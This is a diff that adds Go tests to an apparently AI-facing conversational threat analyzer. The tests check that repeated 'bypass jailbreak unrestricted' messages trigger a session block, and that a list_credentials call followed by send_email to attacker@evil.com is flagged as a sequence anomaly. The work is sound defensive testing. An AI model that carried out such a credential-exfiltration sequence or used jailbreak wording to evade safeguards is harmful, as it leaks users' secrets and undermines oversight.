@@ -348,6 +348,102 @@ func TestSessionManagement(t *testing.T) {
 	t.Logf("✅ Session management: Cleanup working correctly")
 }
 
+// TestSessionLevelAnomalyBlock verifies ISC-16:
+// when multiple messages produce threat scores consistently above the EWMA block
+// threshold, ConversationRisk becomes "critical" and BlockConversation is true.
+func TestSessionLevelAnomalyBlock(t *testing.T) {
+	analyzerConfig := AnalyzerConfig{
+		MaxSessionAge:         30 * time.Minute,
+		MaxHistorySize:        50,
+		ThreatThreshold:       0.5,
+		CleanupInterval:       5 * time.Minute,
+		JailbreakThreshold:    0.6,
+		RoleEscalationLimit:   3,
+		AnomalyEWMAAlpha:      0.5, // fast convergence for test
+		AnomalyBlockThreshold: 0.70,
+	}
+
+	logger := createTestLogger()
+	analyzer := NewConversationalThreatAnalyzer(analyzerConfig, logger)
+	defer analyzer.Stop()
+
+	sessionID := "anomaly-block-test"
+	userID := "test-user"
+
+	// Each message has content that individually scores above 0.70:
+	// "bypass" triggers 0.3, "jailbreak" triggers 0.5 → raw = 0.8 after cap
+	highThreatMsg := `{"method": "tools/call"} bypass jailbreak unrestricted`
+
+	var lastAssessment *ThreatAssessment
+	for i := 0; i < 6; i++ {
+		lastAssessment = analyzer.AnalyzeMessage(sessionID, userID, highThreatMsg)
+		t.Logf("msg %d: threat=%.2f ewma=%.2f risk=%s block=%v",
+			i+1,
+			lastAssessment.CurrentThreatScore,
+			analyzer.sessions[sessionID].AnomalyEWMA,
+			lastAssessment.ConversationRisk,
+			lastAssessment.BlockConversation,
+		)
+	}
+
+	if lastAssessment.ConversationRisk != "critical" {
+		t.Errorf("expected ConversationRisk=critical after persistent high-threat messages, got %q", lastAssessment.ConversationRisk)
+	}
+	if !lastAssessment.BlockConversation {
+		t.Errorf("expected BlockConversation=true after EWMA exceeds threshold")
+	}
+	ewma := analyzer.sessions[sessionID].AnomalyEWMA
+	if ewma < analyzerConfig.AnomalyBlockThreshold {
+		t.Errorf("expected AnomalyEWMA >= %.2f, got %.2f", analyzerConfig.AnomalyBlockThreshold, ewma)
+	}
+	t.Logf("✅ ISC-16: EWMA=%.2f triggered critical block after persistent threat", ewma)
+}
+
+// TestToolCallSequenceAnomaly verifies ISC-112:
+// sending list_credentials then send_email to the same session produces
+// "sequence_anomaly" in AttackPatterns.
+func TestToolCallSequenceAnomaly(t *testing.T) {
+	analyzerConfig := AnalyzerConfig{
+		MaxSessionAge:      30 * time.Minute,
+		MaxHistorySize:     50,
+		ThreatThreshold:    0.3,
+		CleanupInterval:    5 * time.Minute,
+		JailbreakThreshold: 0.6,
+		RoleEscalationLimit: 3,
+		SequenceWindowSize: 10 * time.Minute,
+	}
+
+	logger := createTestLogger()
+	analyzer := NewConversationalThreatAnalyzer(analyzerConfig, logger)
+	defer analyzer.Stop()
+
+	sessionID := "seq-anomaly-test"
+	userID := "test-user"
+
+	// First tool call: list_credentials
+	msg1 := `{"method": "list_credentials", "params": {}}`
+	a1 := analyzer.AnalyzeMessage(sessionID, userID, msg1)
+	t.Logf("After list_credentials: patterns=%v", a1.AttackPatterns)
+
+	// Second tool call: send_email (matches "send_*" glob)
+	msg2 := `{"method": "send_email", "params": {"to": "attacker@evil.com"}}`
+	a2 := analyzer.AnalyzeMessage(sessionID, userID, msg2)
+	t.Logf("After send_email: patterns=%v", a2.AttackPatterns)
+
+	found := false
+	for _, p := range a2.AttackPatterns {
+		if p == "sequence_anomaly" {
+			found = true
+			break
+		}
+	}
+	if !found {
+		t.Errorf("expected 'sequence_anomaly' in AttackPatterns after list_credentials → send_email, got %v",
+			a2.AttackPatterns)
+	}
+	t.Logf("✅ ISC-112: sequence_anomaly detected for list_credentials → send_email")
+}
+
 // TestHistoryLimiting tests conversation history size limits
 func TestHistoryLimiting(t *testing.T) {
 	analyzerConfig := AnalyzerConfig{
